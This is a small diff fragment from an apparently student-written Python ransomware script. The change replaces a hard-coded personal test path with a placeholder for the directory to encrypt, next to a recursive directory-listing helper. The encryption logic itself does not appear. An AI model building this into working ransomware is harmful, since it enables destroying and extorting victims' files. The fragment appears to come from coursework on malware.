@@ -14,7 +14,7 @@ def listDirectories(Dirpath):
                 listDirectories(Dirpath + resultado + "/")
 
 
-path = "/home/th3r4ven/Documents/aula/checkpoint3/ransomware/teste/"
+path = "directory path do encrypt(Full path works better)" # Remember to put a / at the end E.g: /home/kali/Documents/
 files = []
 directories = []
 listagem = (os.listdir(path))
